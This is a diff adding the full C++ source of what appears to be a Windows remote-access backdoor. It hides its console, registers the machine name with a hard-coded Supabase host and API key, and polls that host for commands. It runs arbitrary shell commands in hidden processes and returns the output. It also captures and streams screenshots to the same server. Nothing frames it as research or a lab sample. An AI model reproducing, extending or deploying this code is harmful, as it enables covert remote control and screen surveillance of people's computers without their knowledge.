@@ -1,0 +1,251 @@
+#include <iostream>
+#include <string>
+#include <windows.h>
+#include <winhttp.h>
+#include <sstream>
+#include <vector>
+#include <gdiplus.h>
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "ole32.lib")
+using namespace Gdiplus;
+
+std::string computerName;
+bool screenRunning=false;
+const std::string SB_HOST="odocuexiouhmmkpwtuwk.supabase.co";
+const std::string SB_KEY="sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED";
+
+std::string getComputerName() {
+    char buf[MAX_PATH]; DWORD sz = MAX_PATH;
+    GetComputerNameA(buf, &sz);
+    return std::string(buf, sz);
+}
+
+std::string httpsPost(const std::string& path, const std::string& body) {
+    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
+    if (!s) return "err";
+    HINTERNET c = WinHttpConnect(s, L"odocuexiouhmmkpwtuwk.supabase.co", 443, 0);
+    if (!c) { WinHttpCloseHandle(s); return "err"; }
+    HINTERNET r = WinHttpOpenRequest(c, L"POST", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
+    std::wstring hdr = L"Content-Type: application/json\r\napikey: " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\nAuthorization: Bearer " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\nPrefer: return=minimal\r\n";
+    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
+    WinHttpReceiveResponse(r, 0);
+    std::string out; DWORD n; char buf[256];
+    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
+    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
+    return out;
+}
+
+std::string httpsPatch(const std::string& path, const std::string& body) {
+    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
+    if (!s) return "err";
+    HINTERNET c = WinHttpConnect(s, L"odocuexiouhmmkpwtuwk.supabase.co", 443, 0);
+    if (!c) { WinHttpCloseHandle(s); return "err"; }
+    HINTERNET r = WinHttpOpenRequest(c, L"PATCH", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
+    std::wstring hdr = L"Content-Type: application/json\r\napikey: " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\nAuthorization: Bearer " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\nPrefer: return=minimal\r\n";
+    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
+    WinHttpReceiveResponse(r, 0);
+    std::string out; DWORD n; char buf[256];
+    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
+    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
+    return out;
+}
+
+std::string httpsGet(const std::string& path) {
+    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
+    if (!s) return "";
+    HINTERNET c = WinHttpConnect(s, L"odocuexiouhmmkpwtuwk.supabase.co", 443, 0);
+    if (!c) { WinHttpCloseHandle(s); return ""; }
+    HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
+    std::wstring hdr = L"apikey: " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\nAuthorization: Bearer " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\n";
+    WinHttpSendRequest(r, hdr.c_str(), -1, 0, 0, 0, 0);
+    WinHttpReceiveResponse(r, 0);
+    std::string out; DWORD n; char buf[256];
+    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
+    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
+    return out;
+}
+
+std::string base64Encode(const unsigned char* data, size_t len) {
+    DWORD outLen=0;
+    CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen);
+    std::string out(outLen, 0);
+    CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &out[0], &outLen);
+    out.resize(outLen);
+    return out;
+}
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num=0, size=0;
+    GetImageEncodersSize(&num, &size);
+    if(size==0) return -1;
+    std::vector<unsigned char> buf(size);
+    ImageCodecInfo* p=(ImageCodecInfo*)buf.data();
+    GetImageEncoders(num, size, p);
+    for(UINT i=0;i<num;i++,p++){
+        if(wcscmp(p->MimeType,format)==0){*pClsid=p->Clsid;return i;}
+    }
+    return -1;
+}
+
+std::string takeScreenshot() {
+    int w = GetSystemMetrics(SM_CXSCREEN);
+    int h = GetSystemMetrics(SM_CYSCREEN);
+    int sw = w/4, sh = h/4;
+    HDC hScreen = GetDC(0);
+    HDC hMem = CreateCompatibleDC(hScreen);
+    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, sw, sh);
+    SelectObject(hMem, hBmp);
+    SetStretchBltMode(hMem, COLORONCOLOR);
+    StretchBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, w, h, SRCCOPY);
+    Bitmap bmp(hBmp, NULL);
+    CLSID jpegClsid;
+    GetEncoderClsid(L"image/jpeg", &jpegClsid);
+    IStream* istream = NULL;
+    CreateStreamOnHGlobal(NULL, TRUE, &istream);
+    bmp.Save(istream, &jpegClsid, NULL);
+    STATSTG stat;
+    istream->Stat(&stat, STATFLAG_NONAME);
+    ULONG sz = (ULONG)stat.cbSize.LowPart;
+    std::vector<unsigned char> data(sz);
+    LARGE_INTEGER li = {};
+    istream->Seek(li, STREAM_SEEK_SET, NULL);
+    ULONG read = 0;
+    istream->Read(data.data(), sz, &read);
+    istream->Release();
+    DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(0, hScreen);
+    return base64Encode(data.data(), data.size());
+}
+
+std::string execCmd(const std::string& cmd) {
+    SECURITY_ATTRIBUTES sa={sizeof(sa),0,TRUE};
+    HANDLE hRead,hWrite;
+    CreatePipe(&hRead,&hWrite,&sa,0);
+    STARTUPINFOA si={sizeof(si)};
+    si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
+    si.wShowWindow=SW_HIDE;
+    si.hStdOutput=hWrite;
+    si.hStdError=hWrite;
+    std::string full="cmd.exe /c "+cmd;
+    PROCESS_INFORMATION pi={};
+    if(!CreateProcessA(NULL,&full[0],0,0,TRUE,CREATE_NO_WINDOW,0,0,&si,&pi)){
+        CloseHandle(hRead);CloseHandle(hWrite);return "err";
+    }
+    CloseHandle(hWrite);
+    char buf[4096];std::string out;DWORD n;
+    while(ReadFile(hRead,buf,4095,&n,0)&&n>0){buf[n]=0;out+=buf;}
+    WaitForSingleObject(pi.hProcess,10000);
+    CloseHandle(hRead);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
+    return out;
+}
+
+std::string jsonEscape(const std::string& s) {
+    std::string out;
+    for(char c:s){
+        if(c=='\\')out+="\\\\";
+        else if(c=='"')out+="\\\"";
+        else if(c=='\n')out+="\\n";
+        else if(c=='\r')out+="\\r";
+        else if(c=='\t')out+="\\t";
+        else if(c>=0&&c<0x20)continue;
+        else out+=c;
+    }
+    return out;
+}
+
+std::string extractJson(const std::string& json, const std::string& key) {
+    auto pos = json.find("\"" + key + "\":");
+    if (pos == std::string::npos) return "";
+    pos += key.size() + 3;
+    auto valStart = json.find_first_not_of(" \t\n\r", pos);
+    if (valStart == std::string::npos) return "";
+    if (json[valStart] == '"') {
+        valStart++;
+        auto valEnd = json.find("\"", valStart);
+        if (valEnd == std::string::npos) return "";
+        return json.substr(valStart, valEnd - valStart);
+    }
+    auto valEnd = json.find_first_of(",} \t\n\r", valStart);
+    if (valEnd == std::string::npos) valEnd = json.size();
+    return json.substr(valStart, valEnd - valStart);
+}
+
+void sendPing() {
+    std::string body = "{\"computer\":\"" + computerName + "\"}";
+    httpsPost("/rest/v1/pings", body);
+}
+
+DWORD WINAPI pollThread(LPVOID) {
+    Sleep(3000);
+    sendPing();
+    while(true) {
+        Sleep(2000);
+        try {
+            std::string path = "/rest/v1/commands?computer=eq." + computerName + "&status=eq.pending&order=id.asc&limit=1";
+            std::string resp = httpsGet(path);
+            if (resp.empty() || resp == "[]" || resp.size() < 5) continue;
+            std::string id = extractJson(resp, "id");
+            std::string type = extractJson(resp, "type");
+            std::string payload = extractJson(resp, "payload");
+            if (id.empty() || type.empty()) continue;
+            std::string patchBody = "{\"status\":\"running\"}";
+            httpsPatch("/rest/v1/commands?id=eq." + id, patchBody);
+            std::string result = "";
+            if (type == "screenshot") {
+                result = takeScreenshot();
+            } else if (type == "cmd") {
+                result = execCmd(payload.empty() ? "whoami" : payload);
+            } else if (type == "screen_start") {
+                screenRunning = true;
+                result = "started";
+            } else if (type == "screen_stop") {
+                screenRunning = false;
+                result = "stopped";
+            } else if (type == "screen") {
+                result = takeScreenshot();
+            }
+            std::string escaped = jsonEscape(result);
+            std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+            httpsPatch("/rest/v1/commands?id=eq." + id, resBody);
+        } catch(...) {}
+    }
+    return 0;
+}
+
+DWORD WINAPI screenThread(LPVOID) {
+    while(true) {
+        Sleep(400);
+        if(!screenRunning) continue;
+        try {
+            std::string b64 = takeScreenshot();
+            std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen\",\"payload\":\"\",\"status\":\"pending\"}";
+            std::string resp = httpsPost("/rest/v1/commands", body);
+            std::string id = extractJson(resp, "id");
+            if (!id.empty()) {
+                std::string escaped = jsonEscape(b64);
+                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+                httpsPatch("/rest/v1/commands?id=eq." + id, resBody);
+            }
+        } catch(...) {}
+    }
+    return 0;
+}
+
+int main() {
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) ShowWindow(hwnd, SW_HIDE);
+    computerName = getComputerName();
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    CreateThread(0, 0, pollThread, 0, 0, 0);
+    CreateThread(0, 0, screenThread, 0, 0, 0);
+    MSG msg;
+    while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
+    GdiplusShutdown(gdiplusToken);
+}
